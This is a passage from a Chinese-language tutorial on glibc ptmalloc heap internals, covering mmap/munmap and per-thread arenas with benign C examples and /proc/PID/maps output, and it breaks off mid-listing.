<code>mmap</code> 调用时的长度一致。</li></ul><p><code>munmap</code> 返回值是 0 表示成功，-1 表示失败，并设置 errno 以指示错误原因。</p><h5 id="区别和用途"><a href="#区别和用途" class="headerlink" title="区别和用途"></a>区别和用途</h5><ul><li><code>mmap</code> 用于创建内存映射，可以用于文件 I&#x2F;O、动态内存分配、共享内存等。</li><li><code>munmap</code> 用于撤销已有的内存映射，释放之前 <code>mmap</code> 分配的内存空间。</li><li>使用 <code>mmap</code> 和 <code>munmap</code> 可以提高程序的性能，因为它们允许程序直接在内存中读写文件内容，减少了数据复制的开销。</li><li><code>mmap</code> 还可以用于实现跨进程的内存共享，因为多个进程可以映射同一个文件，从而共享文件内容。</li><li><code>munmap</code> 必须在不再需要映射时调用，以避免内存泄漏。</li></ul><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Private anonymous mapping example using mmap syscall */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg)</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s failed. Exiting the process\n&quot;</span>, msg);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">int</span> ret = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before mmap\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-type">char</span>* addr = <span class="hljs-literal">NULL</span>;<br>        addr = mmap(<span class="hljs-literal">NULL</span>, (<span class="hljs-type">size_t</span>)<span class="hljs-number">132</span>*<span class="hljs-number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>                errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After mmap\n&quot;</span>);<br>        getchar();<br><br>        <span class="hljs-comment">/* Unmap mapped region. */</span><br>        ret = munmap(addr, (<span class="hljs-type">size_t</span>)<span class="hljs-number">132</span>*<span class="hljs-number">1024</span>);<br>        <span class="hljs-keyword">if</span>(ret == <span class="hljs-number">-1</span>)<br>                errExit(<span class="hljs-string">&quot;munmap&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After munmap\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>在执行 mmap 之前</strong></p><p>我们可以从下面的输出看到，目前只有. so 文件的 mmap 段。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="hljs-number">6067</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>在这b<span class="hljs-number">7e21000</span>-b<span class="hljs-number">7e22000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><p><strong>mmap 后</strong></p><p>从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了 b7e00000 到 b7e21000 的 mmap 段。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="hljs-number">6067</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>在这b<span class="hljs-number">7e00000</span>-b<span class="hljs-number">7e22000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><p><strong>munmap</strong></p><p>从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子了。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="hljs-number">6067</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>在这b<span class="hljs-number">7e21000</span>-b<span class="hljs-number">7e22000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是<strong>支持了多线程的快速访问</strong>。在新的实现中，所有的线程共享<strong>多个堆</strong>。</p><p>这里给出一个例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Per thread arena example. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">threadFunc</span><span class="hljs-params">(<span class="hljs-type">void</span>* arg)</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before malloc in thread 1\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-type">char</span>* addr = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After malloc and before free in thread 1\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-built_in">free</span>(addr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After free in thread 1\n&quot;</span>);<br>        getchar();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">pthread_t</span> t1;<br>        <span class="hljs-type">void</span>* s;<br>        <span class="hljs-type">int</span> ret;<br>        <span class="hljs-type">char</span>* addr;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before malloc in main thread\n&quot;</span>);<br>        getchar();<br>        addr = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After malloc and before free in main thread\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-built_in">free</span>(addr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After free in main thread\n&quot;</span>);<br>        getchar();<br>        ret = pthread_create(&amp;t1, <span class="hljs-literal">NULL</span>, threadFunc, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span>(ret)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread creation error\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        ret = pthread_join(t1, &amp;s);<br>        <span class="hljs-keyword">if</span>(ret)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread join error\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pthread_create</code> 是 POSIX 线程库中用于创建新线程的函数。它是 POSIX 线程（pthread）标准的一部分，该标准定义了在多线程程序中创建和管理线程的方法。<code>pthread_create</code> 函数允许程序并行地执行多个线程，从而提高程序的效率和响应能力。</p><p>函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_create</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *thread, <span class="hljs-type">const</span> <span class="hljs-type">pthread_attr_t</span> *attr,<span class="hljs-type">void</span> *(*startroutine)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg)</span>;<br></code></pre></td></tr></table></figure><p>参数说明：</p><ol><li><code>pthread_t *thread</code>：这是一个指向 <code>pthread_t</code> 类型的指针，用于存储新创建线程的标识符。如果线程成功创建，这个变量将被赋予一个唯一的线程ID。</li><li><code>const pthread_attr_t *attr</code>：这是一个指向 <code>pthread_attr_t</code> 类型的指针，它指定了线程的属性。如果设置为 <code>NULL</code>，则使用默认的线程属性。</li><li><code>void *(*startroutine)(void *)</code>：这是新线程开始执行时调用的函数。它是一个函数指针，指向一个接受 <code>void*</code> 类型参数并返回 <code>void*</code> 类型值的函数。</li><li><code>void *arg</code>：这是传递给 <code>startroutine</code> 函数的参数。</li></ol><p>返回值：</p><ul><li><code>0</code>：表示线程成功创建。</li><li>非零值：表示创建线程失败，错误代码会说明具体的错误原因。</li></ul><p><strong>第一次申请之前</strong>， 没有任何任何堆段。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>b<span class="hljs-number">7e05000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>第一次申请后</strong>， 从下面的输出可以看出，堆段被建立了，并且它就紧邻着数据段，这说明 malloc 的背后是用 brk 函数来实现的。同时，需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了 0x0806c000-0x0804b000&#x3D;0x21000 个字节的堆。<strong>这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong>我们称这一块连续的内存区域为 <strong>arena</strong>。此外，我们称由主线程申请的内存为 <strong>main_arena</strong>。后续的申请的内存会一直从这个 <strong>arena</strong> 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>./mthread<br><span class="hljs-title class_">Welcome</span> to per thread arena example::<span class="hljs-number">6501</span><br><span class="hljs-title class_">Before</span> malloc <span class="hljs-keyword">in</span> main thread<br><span class="hljs-title class_">After</span> malloc <span class="hljs-keyword">and</span> before free <span class="hljs-keyword">in</span> main thread<br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/lsploits/hof/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>cat /<span class="hljs-built_in">proc</span>/<span class="hljs-number">6501</span>/maps<br>08048000-08049000 r-xp <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p <span class="hljs-number">00001000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b7e05000-b7e07000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在主线程释放内存后</strong>，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>./mthread<br><span class="hljs-title class_">Welcome</span> to per thread arena example::<span class="hljs-number">6501</span><br><span class="hljs-title class_">Before</span> malloc <span class="hljs-keyword">in</span> main thread<br><span class="hljs-title class_">After</span> malloc <span class="hljs-keyword">and</span> before free <span class="hljs-keyword">in</span> main thread<br><span class="hljs-title class_">After</span> free <span class="hljs-keyword">in</span> main thread<br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/lsploits/hof/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>cat /<span class="hljs-built_in">proc</span>/<span class="hljs-number">6501</span>/maps<br>08048000-08049000 r-xp <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p <span class="hljs-number">00001000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b7e05000-b7e07000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在第一个线程 malloc 之前</strong>，我们可以看到并没有出现与线程 1 相关的堆，但是出现了与线程 1 相关的栈。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread <span class="hljs-number">1</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804b000</span>-<span class="hljs-number">0806c000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b<span class="hljs-number">7604000</span>-b<span class="hljs-number">7605000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7605000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [stack:<span class="hljs-number">6594</span>]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>第一个线程 malloc 后</strong>， 我们可以从下面输出看出线程 1 的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是 132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为**mmap **函数。同时，我们可以看出实际真的分配给程序的内存为 1M(b7500000-b7600000)。而且，只有 132KB 的部分具有可读可写权限，这一块连续的区域成为 <strong>thread arena。</strong></p><p>注意：</p><blockquote><p><strong>当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时</strong>，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p></blockquote><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread <span class="hljs-number">1</span><br>After malloc and before free in thread <span class="hljs-number">1</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804b000</span>-<span class="hljs-number">0806c000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b<span class="hljs-number">7500000</span>-b<span class="hljs-number">7521000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7521000</span>-b<span class="hljs-number">7600000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7604000</span>-b<span class="hljs-number">7605000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7605000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [stack:<span class="hljs-number">6594</span>]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在第一个线程释放内存后</strong>， 我们可以从下面的输出看到，这样释放内存同样<strong>不会</strong>把内存重新给系统。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread <span class="hljs-number">1</span><br>After malloc and before free in thread <span class="hljs-number">1</span><br>After free in thread <span class="hljs-number">1</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> 